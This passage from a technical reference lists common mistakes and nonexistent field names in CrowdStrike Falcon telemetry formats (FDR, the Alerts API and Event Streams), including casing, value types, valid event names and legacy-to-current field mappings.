## 6. Common mistakes / fields that do NOT exist

- **Mixing casings**: FDR is PascalCase (`CommandLine`, `ImageFileName`, `SHA256HashData`); Alerts API is
  snake_case (`cmdline`, `filepath`, `sha256`); Event Streams is PascalCase but with different names
  (`SHA256String`, `FilePath`, `Hostname`). Do not put `cmdline` on an FDR event or `SHA256HashData` on an alert.
- FDR values are **strings** (`"RemotePort":"443"`, `"timestamp":"1790669662417"`). Alerts API values are typed
  (`"severity":70`, `"show_in_ui":true`).
- `ComputerName`, `UserName`, `ParentImageFileName`, `ParentCommandLine` are **not** fields of a raw FDR
  `ProcessRollup2` (only `ParentBaseFileName`; host name lives in aidmaster/`AgentOnline`; user name comes from
  `UserIdentity`/`UserLogon`). Falcon Event Search may display joined values — that is enrichment, not the raw event.
  (Observed in all retrieved raw samples; CrowdStrike may add fields on newer sensors — **UNVERIFIED** absence on 7.3x+.)
- `event_simpleName` values that do NOT exist: `ProcessCreate`, `ProcessCreation`, `NetworkConnection`,
  `DnsQuery`, `FileCreate`, `FileWrite`. Use `ProcessRollup2`, `NetworkConnectIP4`, `DnsRequest`, `PeFileWritten` /
  `NewExecutableWritten` / `NewScriptWritten` / `GenericFileWritten`.
- No `ProcessId` / `PID` field on FDR PR2 — it's `RawProcessId` (OS) and `TargetProcessId` (Falcon).
- `DestinationIp`, `RemoteIP`, `SourceIp`, `dst_ip` do not exist in FDR — use `RemoteAddressIP4` / `LocalAddressIP4`.
- Legacy vs current detection objects:
  - Detects API (decommissioned 2025-09-30) used `detection_id` (`ldt:<aid>:<n>`), `max_severity`,
    `max_severity_displayname`, `behaviors[]` array, `first_behavior`, `device.hostname`. The Alerts API flattens
    one behaviour per alert and uses `composite_id`, `severity`, `severity_name`. Don't emit `behaviors[]` or
    `max_severity_displayname` in a current alert.
  - Event Streams `DetectionSummaryEvent` (legacy) → `EppDetectionSummaryEvent` (current): `DetectName`→`Name`,
    `DetectDescription`→`Description`, `ComputerName`→`Hostname`, `SensorId`→`AgentId`, `DetectId`→`CompositeId`;
    legacy `Severity` was 1–5, current `Severity` is 0–100 with `SeverityName`.
- Invented fields seen in training material that do NOT exist: `crowdstrike.alert_title`, `cs.detection_name`,
  `event.ProcessName`, `ThreatName`, `DetectionURL`, `MitreTechnique` (use `technique_id`), `Action:"blocked"`
  (use `pattern_disposition*`).
- No SIEM wrappers: no `crowdstrike.fdr.*`, no `data.*`, no `@timestamp`, no `event.kind` — those are Elastic/Wazuh.
